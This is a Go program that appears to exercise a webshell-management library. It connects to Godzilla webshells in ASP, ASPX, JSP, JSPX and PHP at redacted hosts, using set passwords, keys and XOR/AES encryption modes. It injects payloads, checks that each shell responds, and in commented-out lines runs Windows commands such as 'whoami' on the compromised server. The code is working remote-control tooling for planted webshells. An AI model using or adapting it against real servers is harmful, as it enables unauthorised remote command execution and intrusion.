package main

import (
	"fmt"
	"github.com/Go0p/wsm"
	"github.com/Go0p/wsm/lib/shell"
	"github.com/Go0p/wsm/lib/shell/godzilla"
	"log"
)

const (
	AspRawShellUrl   = "http://***REMOVED***:8081/xorraw.asp"
	AspBs64ShellUrl  = "http://***REMOVED***:8081/xorbs64.asp"
	AspxBs64ShellUrl = "http://***REMOVED***:8081/bs64.aspx"
	AspxRawShellUrl  = "http://***REMOVED***:8081/raw.aspx"
	JspBs64ShellUrl  = "http://***REMOVED***:8080/bs64.jsp"
	JspRawShellUrl   = "http://***REMOVED***:8080/raw.jsp"
	JspxBs64ShellUrl = "http://***REMOVED***:8080/bs64.jspx"
	JspxRawShellUrl  = "http://***REMOVED***:8080/raw.jspx"
	PhpBs64ShellUrl  = "http://***REMOVED***/bs64.php"
	PhpRawShellUrl   = "http://***REMOVED***/raw.php"
)

func main() {
	log.SetFlags(log.Lshortfile)
	//log.Println("Jsp")
	//testJspBs64()
	//testJspRaw()
	//
	//log.Println("Jspx")
	//testJspxBs64()
	//testJspxRaw()

	log.Println("Aspx")
	testAspxBs64()
	testAspxRaw()

	//log.Println("Asp")
	//testAspBs64()
	//testAspRaw()

	//log.Println("Php")
	//testPhpBs64()
	//testPhpRaw()
}

func testPhpBs64() {
	info := &wsm.GodzillaInfo{
		BaseShell: wsm.BaseShell{
			Url:      PhpBs64ShellUrl,
			Password: "pass",
			Script:   shell.PhpScript,
			Proxy:    "http://127.0.0.1:9999",
		},
		Key:      "key",
		Crypto:   godzilla.PHP_XOR_BASE64,
		Encoding: godzilla.UTF8CharSet,
	}
	g, err := wsm.NewGodzillaInfo(info)
	if err != nil {
		log.Println(err)
	}
	g.InjectPayload()

	isAlive := g.Ping()
	fmt.Println(isAlive)
}

func testPhpRaw() {
	info := &wsm.GodzillaInfo{
		BaseShell: wsm.BaseShell{
			Url:      PhpRawShellUrl,
			Password: "pass",
			Script:   shell.PhpScript,
			Proxy:    "http://127.0.0.1:9999",
		},
		Key:      "key",
		Crypto:   godzilla.PHP_XOR_RAW,
		Encoding: godzilla.UTF8CharSet,
	}
	g, err := wsm.NewGodzillaInfo(info)
	if err != nil {
		log.Println(err)
	}
	g.InjectPayload()

	isAlive := g.Ping()
	fmt.Println(isAlive)
}

func testAspxBs64() {
	info := &wsm.GodzillaInfo{
		BaseShell: wsm.BaseShell{
			Url:      AspxBs64ShellUrl,
			Password: "pass",
			Script:   shell.CsharpScript,
			Proxy:    "http://127.0.0.1:9999",
		},
		Key:      "key",
		Crypto:   godzilla.CSHARP_AES_BASE64,
		Encoding: godzilla.UTF8CharSet,
	}
	g, err := wsm.NewGodzillaInfo(info)
	if err != nil {
		log.Println(err)
	}
	g.InjectPayload()

	isAlive := g.Ping()
	fmt.Println(isAlive)
}

func testAspxRaw() {
	info := &wsm.GodzillaInfo{
		BaseShell: wsm.BaseShell{
			Url:      AspxRawShellUrl,
			Password: "pass",
			Script:   shell.CsharpScript,
			Proxy:    "http://127.0.0.1:9999",
		},
		Key:      "key",
		Crypto:   godzilla.CSHARP_AES_RAW,
		Encoding: godzilla.UTF8CharSet,
	}
	g, err := wsm.NewGodzillaInfo(info)
	if err != nil {
		log.Println(err)
	}
	g.InjectPayload()

	isAlive := g.Ping()
	fmt.Println(isAlive)
}

func testAspBs64() {
	info := &wsm.GodzillaInfo{
		BaseShell: wsm.BaseShell{
			Url:      AspBs64ShellUrl,
			Password: "pass",
			Script:   shell.AspScript,
			Proxy:    "http://127.0.0.1:9999",
		},
		Key:      "key",
		Crypto:   godzilla.ASP_XOR_BASE64,
		Encoding: godzilla.UTF8CharSet,
	}
	g, err := wsm.NewGodzillaInfo(info)
	if err != nil {
		log.Println(err)
	}
	g.InjectPayload()

	isAlive := g.Ping()
	fmt.Println(isAlive)
}

func testAspRaw() {
	info := &wsm.GodzillaInfo{
		BaseShell: wsm.BaseShell{
			Url:      AspRawShellUrl,
			Password: "pass",
			Script:   shell.AspScript,
			Proxy:    "http://127.0.0.1:9999",
		},
		Key:      "key",
		Crypto:   godzilla.ASP_XOR_RAW,
		Encoding: godzilla.UTF8CharSet,
	}
	g, err := wsm.NewGodzillaInfo(info)
	if err != nil {
		log.Println(err)
	}
	g.InjectPayload()

	isAlive := g.Ping()
	fmt.Println(isAlive)
}

func testJspxBs64() {
	info := &wsm.GodzillaInfo{
		BaseShell: wsm.BaseShell{
			Url:      JspxBs64ShellUrl,
			Password: "pass",
			Script:   shell.JavaScript,
			Proxy:    "http://127.0.0.1:9999",
		},
		Key:      "key",
		Crypto:   godzilla.JAVA_AES_BASE64,
		Encoding: godzilla.UTF8CharSet,
	}
	g, err := wsm.NewGodzillaInfo(info)
	if err != nil {
		log.Println(err)
	}
	g.InjectPayload()

	isAlive := g.Ping()
	fmt.Println(isAlive)
}

func testJspxRaw() {
	info := &wsm.GodzillaInfo{
		BaseShell: wsm.BaseShell{
			Url:      JspxRawShellUrl,
			Password: "pass",
			Script:   shell.JavaScript,
			Proxy:    "http://127.0.0.1:9999",
		},
		Key:      "key",
		Crypto:   godzilla.JAVA_AES_RAW,
		Encoding: godzilla.UTF8CharSet,
	}
	g, err := wsm.NewGodzillaInfo(info)
	if err != nil {
		log.Println(err)
	}
	g.InjectPayload()

	isAlive := g.Ping()
	fmt.Println(isAlive)
}

func testJspBs64() {
	info := &wsm.GodzillaInfo{
		BaseShell: wsm.BaseShell{
			Url:      JspBs64ShellUrl,
			Password: "pass",
			Script:   shell.JavaScript,
			Proxy:    "http://127.0.0.1:9999",
		},
		Key:      "key",
		Crypto:   godzilla.JAVA_AES_BASE64,
		Encoding: godzilla.UTF8CharSet,
	}
	g, err := wsm.NewGodzillaInfo(info)
	if err != nil {
		log.Println(err)
	}
	g.InjectPayload()

	isAlive := g.Ping()
	fmt.Println(isAlive)
	//basicInfo1 := g.CommandExec(`cmd /c "cd /d "D:/Jdk/apache-tomcat-7.0.109/bin/"&echo 你好"`)
	//fmt.Println("Info : ", basicInfo1)

	//basicInfo := g.CommandExec(`cmd /c "cd /d "D:/Jdk/apache-tomcat-7.0.109/bin/"&print 1"`)
	//basicInfo := g.CommandExec(`cmd /c "cd /d "D:/Jdk/apache-tomcat-7.0.109/bin/"&whoami /"`)
	//fmt.Println("Info : ", basicInfo)
}

func testJspRaw() {
	info := &wsm.GodzillaInfo{
		BaseShell: wsm.BaseShell{
			Url:      JspRawShellUrl,
			Password: "pass",
			Script:   shell.JavaScript,
			Proxy:    "http://127.0.0.1:9999",
		},
		Key:      "key",
		Crypto:   godzilla.JAVA_AES_RAW,
		Encoding: godzilla.UTF8CharSet,
	}
	g, err := wsm.NewGodzillaInfo(info)
	if err != nil {
		log.Println(err)
	}
	g.InjectPayload()

	isAlive := g.Ping()
	fmt.Println(isAlive)
	//basicInfo1 := g.CommandExec(`cmd /c "cd /d "D:/Jdk/apache-tomcat-7.0.109/bin/"&echo 你好"`)
	//fmt.Println("Info : ", basicInfo1)

	//basicInfo := g.CommandExec(`cmd /c "cd /d "D:/Jdk/apache-tomcat-7.0.109/bin/"&print 1"`)
	//basicInfo := g.CommandExec(`cmd /c "cd /d "D:/Jdk/apache-tomcat-7.0.109/bin/"&whoami /"`)
	//fmt.Println("Info : ", basicInfo)
}
